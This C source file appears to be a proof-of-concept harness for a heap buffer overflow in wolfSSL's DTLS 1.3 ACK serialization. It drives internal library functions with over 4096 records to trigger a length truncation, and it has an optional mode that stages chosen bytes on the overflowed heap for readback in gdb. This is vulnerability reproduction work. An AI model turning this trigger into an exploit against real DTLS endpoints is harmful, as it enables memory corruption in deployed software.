/*
 * CVE-2026-6679 in-process reproduction harness.
 *
 * Drives the REAL pinned wolfSSL library (no library source modifications).
 * It builds a DTLS 1.3 WOLFSSL object, feeds more than 4096 distinct
 * (epoch, sequence) pairs into Dtls13RtxAddAck(), then calls
 * Dtls13WriteAckMessage() directly.  In v5.9.0 the ACK list length is
 * truncated to word16, so the serialization loop writes 16 bytes per record
 * into an undersized output buffer.  v5.9.1 caps the list and checks the
 * write count.
 *
 * Usage: ack_overflow [N] [CHOSEN|DEFAULT]
 *   N         number of records to insert (default 4097)
 *   CHOSEN    use recognizable per-record byte patterns for optional gdb
 *             readback of the staged heap after the overflow
 *   DEFAULT   simple ascending sequence numbers (default)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <wolfssl/options.h>
#include <wolfssl/version.h>
#include <wolfssl/ssl.h>
#include <wolfssl/internal.h>
#include <wolfssl/wolfcrypt/types.h>

#ifndef WOLFSSL_DTLS13
#error "WOLFSSL_DTLS13 is not defined in wolfssl/options.h"
#endif

#if LIBWOLFSSL_VERSION_HEX >= 0x05009001
#define FIXED_API 1
#else
#define FIXED_API 0
#endif

#define DEFAULT_N 4097

/* On this build WORD64_AVAILABLE is set; w64wrapper contains word64 n.
 * c64toa() serializes n in network (big-endian) byte order. */
static w64wrapper make_w64(word64 value)
{
    w64wrapper w;
    XMEMSET(&w, 0, sizeof(w));
#if defined(WORD64_AVAILABLE) && !defined(WOLFSSL_W64_WRAPPER_TEST)
    w.n = value;
#else
#error "harness requires WORD64_AVAILABLE w64wrapper layout"
#endif
    return w;
}

static w64wrapper ack_epoch(int chosen)
{
    /* Constant 64-bit epoch: 1122334455667788 (or C0FFEE1122334455). */
    return chosen ? make_w64(0xC0FFEE1122334455ULL)
                  : make_w64(0x1122334455667788ULL);
}

static w64wrapper ack_seq(unsigned int i, int chosen)
{
    if (chosen) {
        /* Serialized bytes: A5 5A 00 00 <i as 4 big-endian bytes>.
         * The value grows with i, so the sorted list stays index ordered. */
        return make_w64((0xA5ULL << 56) | (0x5AULL << 48) | ((word64)i));
    }
    return make_w64((word64)i + 1ULL);
}

static int list_count(const WOLFSSL* ssl)
{
    const Dtls13RecordNumber* p = ssl->dtls13Rtx.seenRecords;
    int n = 0;
    while (p != NULL) {
        n++;
        p = p->next;
    }
    return n;
}

int main(int argc, char** argv)
{
    WOLFSSL_CTX* ctx = NULL;
    WOLFSSL* ssl = NULL;
    Dtls13Epoch* encEpoch = NULL;
    w64wrapper epoch;
    word32 length = 0;
    word16 truncated;
    unsigned exact;
    int chosen = 0;
    int count;
    int n = DEFAULT_N;
    int ret;
    int ok = 1;

    if (argc > 1) {
        n = atoi(argv[1]);
        if (n < 2) {
            fprintf(stderr, "N must be >= 2\n");
            return 2;
        }
    }
    if (argc > 2) {
        if (strcmp(argv[2], "CHOSEN") == 0)
            chosen = 1;
        else if (strcmp(argv[2], "DEFAULT") != 0) {
            fprintf(stderr, "mode must be CHOSEN or DEFAULT\n");
            return 2;
        }
    }

    printf("FACT version=%s\n", LIBWOLFSSL_VERSION_STRING);
    printf("FACT api=%s\n", FIXED_API ? "fixed-5.9.1" : "vulnerable-5.9.0");
    printf("FACT mode=%s\n", chosen ? "CHOSEN" : "DEFAULT");
    printf("FACT requested=%d\n", n);

    if (wolfSSL_library_init() != WOLFSSL_SUCCESS) {
        fprintf(stderr, "wolfSSL_library_init failed\n");
        return 2;
    }

    ctx = wolfSSL_CTX_new(wolfDTLSv1_3_client_method());
    if (ctx == NULL) {
        fprintf(stderr, "wolfSSL_CTX_new(DTLS1.3 client) failed\n");
        return 2;
    }
    ssl = wolfSSL_new(ctx);
    if (ssl == NULL) {
        fprintf(stderr, "wolfSSL_new failed\n");
        wolfSSL_CTX_free(ctx);
        return 2;
    }

    /* Dtls13WriteAckMessage returns BAD_STATE_E unless this is set.  Set up a
     * real Dtls13Epoch through wolfSSL's allocator; epochNumber zero selects
     * the unprotected-ACK header path in the serializer. */
    encEpoch = (Dtls13Epoch*)XMALLOC(sizeof(Dtls13Epoch), ssl->heap,
        DYNAMIC_TYPE_TMP_BUFFER);
    if (encEpoch == NULL) {
        fprintf(stderr, "epoch allocation failed\n");
        ok = 0;
        goto done;
    }
    XMEMSET(encEpoch, 0, sizeof(*encEpoch));
    ssl->dtls13EncryptEpoch = encEpoch;

    epoch = ack_epoch(chosen);

    /* Insert in descending order: the sorted list inserts each new record at
     * the head, so the final list is ordered by i with record 0 first. */
    for (int i = n - 1; i >= 0; i--) {
        if (Dtls13RtxAddAck(ssl, epoch, ack_seq((unsigned)i, chosen)) != 0) {
            fprintf(stderr, "Dtls13RtxAddAck failed at i=%d\n", i);
            ok = 0;
            goto done;
        }
    }

    count = list_count(ssl);
    exact = 16u * (unsigned)count;
    truncated = (word16)(16 * count);
    printf("FACT list_count=%d\n", count);
    printf("FACT word16_length=%u\n", (unsigned)truncated);
    printf("FACT exact_length=%u\n", exact);
    printf("FACT truncation=%s\n",
        exact != (unsigned)truncated ? "YES" : "NO");
    fflush(stdout);

    /* This is the sink.  On the vulnerable build ASan aborts inside the
     * c64toa() writes in Dtls13WriteAckMessage (src/dtls13.c). */
#if FIXED_API
    ret = Dtls13WriteAckMessage(ssl, ssl->dtls13Rtx.seenRecords,
        ssl->dtls13Rtx.seenRecordsCount, &length);
#else
    ret = Dtls13WriteAckMessage(ssl, ssl->dtls13Rtx.seenRecords, &length);
#endif

    printf("FACT write_ret=%d\n", ret);
    printf("FACT returned_length=%u\n", length);
    fflush(stdout);
    if (ret != 0)
        ok = 0;

done:
    if (encEpoch != NULL) {
        if (ssl != NULL)
            ssl->dtls13EncryptEpoch = NULL;
        XFREE(encEpoch, ssl != NULL ? ssl->heap : NULL,
            DYNAMIC_TYPE_TMP_BUFFER);
    }
    if (ssl != NULL)
        wolfSSL_free(ssl);
    if (ctx != NULL)
        wolfSSL_CTX_free(ctx);
    printf("FACT harness_ok=%s\n", ok ? "YES" : "NO");
    fflush(stdout);
    return ok ? 0 : 1;
}
